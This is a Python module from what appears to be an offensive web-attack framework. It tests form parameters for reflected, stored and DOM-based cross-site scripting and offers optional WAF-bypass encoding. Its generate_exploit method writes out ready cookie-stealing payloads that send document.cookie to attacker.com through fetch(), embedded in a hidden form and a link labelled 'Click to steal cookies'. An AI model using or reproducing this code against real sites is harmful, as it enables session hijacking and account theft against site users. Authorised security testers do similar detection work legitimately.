#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - XSS Module
Cross-Site Scripting detection and exploitation
"""

import re
from config import Payloads, Colors


class XSSModule:
    """XSS Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "XSS"
        
        # XSS signatures
        self.xss_signatures = [
            '<script>',
            'javascript:',
            'onerror=',
            'onload=',
            'onmouseover=',
            'onclick=',
            'onfocus=',
            'eval(',
            'alert(',
            'confirm(',
            'prompt(',
        ]
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for XSS"""
        # Test reflected XSS
        self._test_reflected(url, method, param, value)
        
        # Test stored XSS (limited)
        self._test_stored(url, method, param, value)
        
        # Test DOM XSS indicators
        self._test_dom(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for XSS"""
        pass
    
    def _test_reflected(self, url: str, method: str, param: str, value: str):
        """Test for reflected XSS"""
        payloads = Payloads.XSS_PAYLOADS
        
        # Apply WAF bypass if enabled
        if self.engine.config.get('waf_bypass'):
            all_payloads = []
            for p in payloads:
                all_payloads.extend(self.requester.waf_bypass_encode(p))
            payloads = list(set(all_payloads))
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                response_text = response.text
                
                # Check if payload is reflected
                if payload in response_text:
                    # Check if it's properly sanitized
                    sanitized = self._is_sanitized(payload, response_text)
                    
                    from core.engine import Finding
                    if not sanitized:
                        finding = Finding(
                            technique="XSS (Reflected)",
                            url=url,
                            severity='HIGH',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence="Payload reflected without sanitization",
                        )
                    else:
                        finding = Finding(
                            technique="XSS (Potentially Filtered)",
                            url=url,
                            severity='MEDIUM',
                            confidence=0.6,
                            param=param,
                            payload=payload,
                            evidence="Payload reflected but may be sanitized",
                        )
                    
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'XSS test error: {e}')}")
    
    def _test_stored(self, url: str, method: str, param: str, value: str):
        """Test for stored XSS (basic check)"""
        # This is a simplified check - full stored XSS testing requires
        # submitting data and checking other pages
        stored_payloads = [
            '<script>alert("stored_xss_test")</script>',
            '<img src=x onerror=alert("stored_xss_test")>',
        ]
        
        for payload in stored_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if response and response.status_code == 200:
                    # Note: We can't confirm stored XSS without checking other pages
                    # This is just a marker that payload was accepted
                    pass
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'Stored XSS test error: {e}')}")
    
    def _test_dom(self, url: str, method: str, param: str, value: str):
        """Test for DOM XSS indicators"""
        dom_indicators = [
            'document.write',
            'document.location',
            'window.location',
            'eval(',
            'innerHTML',
            'outerHTML',
            'insertAdjacentHTML',
            'setTimeout(',
            'setInterval(',
        ]
        
        try:
            response = self.requester.request(url, 'GET')
            
            if not response:
                return
            
            for indicator in dom_indicators:
                if indicator in response.text:
                    # Check if user input reaches these sinks
                    test_value = "xss_test_12345"
                    data = {param: test_value}
                    
                    test_response = self.requester.request(url, method, data=data)
                    
                    if test_response and test_value in test_response.text:
                        # Check if it's near a DOM sink
                        pattern = rf'{re.escape(indicator)}.*{re.escape(test_value)}|{re.escape(test_value)}.*{re.escape(indicator)}'
                        if re.search(pattern, test_response.text, re.DOTALL):
                            from core.engine import Finding
                            finding = Finding(
                                technique="XSS (DOM-based)",
                                url=url,
                                severity='MEDIUM',
                                confidence=0.7,
                                param=param,
                                payload=test_value,
                                evidence=f"User input reaches DOM sink: {indicator}",
                            )
                            self.engine.add_finding(finding)
                            return
                            
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'DOM XSS test error: {e}')}")
    
    def _is_sanitized(self, payload: str, response: str) -> bool:
        """Check if payload was sanitized"""
        # Check for common sanitization patterns
        sanitized_patterns = [
            '&lt;',  # HTML entities
            '&gt;',
            '&quot;',
            '&#x3C;',  # Hex encoding
            '&#x3E;',
            '\\x3c',  # JS escaping
            '\\x3e',
            '\\u003c',  # Unicode escaping
            '\\u003e',
        ]
        
        for pattern in sanitized_patterns:
            if pattern in response:
                return True
        
        # Check if script tags were removed
        if '<script>' in payload and '<script>' not in response:
            return True
        
        return False
    
    def generate_exploit(self, url: str, param: str, xss_type: str = 'reflected') -> str:
        """Generate XSS exploit code"""
        if xss_type == 'reflected':
            exploit = f"""
<!-- XSS Exploit -->
<form action="{url}" method="GET">
    <input type="hidden" name="{param}" value='<script>fetch("http://attacker.com/?c="+document.cookie)</script>'>
    <input type="submit" value="Click to steal cookies">
</form>

<!-- Or direct link -->
<a href="{url}?{param}=<script>fetch('http://attacker.com/?c='+document.cookie)</script>">Click here</a>
"""
        else:
            exploit = f"""
<!-- Stored XSS would be triggered when visiting the affected page -->
<script>
// Cookie stealer
fetch('http://attacker.com/?c=' + document.cookie);
</script>
"""
        
        return exploit
